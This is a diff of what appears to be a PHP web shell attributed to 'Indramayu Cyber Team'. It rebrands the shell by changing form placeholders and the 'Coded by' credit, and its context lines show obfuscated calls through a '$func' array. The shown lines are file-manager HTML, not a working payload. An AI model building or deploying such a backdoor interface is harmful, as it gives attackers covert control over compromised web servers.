@@ -453,7 +453,7 @@ $scandir = $func[21]($dir);
 									<form action="" method="post">
 										<div class="mb-3">
 											<label class="form-label">File Name</label>
-											<input type="text" class="form-control" name="filename" placeholder="bibib.txt">
+											<input type="text" class="form-control" name="filename" placeholder="./sToryAn9el.txt">
 										</div>
 										<div class="mb-3">
 											<label class="form-label">File Content</label>
@@ -474,7 +474,7 @@ $scandir = $func[21]($dir);
 									<form action="" method="post">
 										<div class="mb-3">
 											<label class="form-label">Folder Name</label>
-											<input type="text" class="form-control" name="foldername" placeholder="bibib">
+											<input type="text" class="form-control" name="foldername" placeholder="./sToryAn9el">
 										</div>
 										<button type="submit" class="btn btn-outline-dark">Create</button>
 									</form>
@@ -655,7 +655,7 @@ $scandir = $func[21]($dir);
 			<div class="col-md-12 my-3">
 				<div class="card border-dark">
 					<div class="card-body">
-						Copyright © Indramayu Cyber Team <span class="float-end">Coded by <span class="text-muted">Bibib</span></span>
+						Copyright © Indramayu Cyber Team <span class="float-end">Coded by <span class="text-muted">./sTory An9el </span></span>
 					</div>
 				</div>
 			</div>
@@ -800,3 +800,4 @@ $scandir = $func[21]($dir);
 	</script>
 </body>
 </html>
+
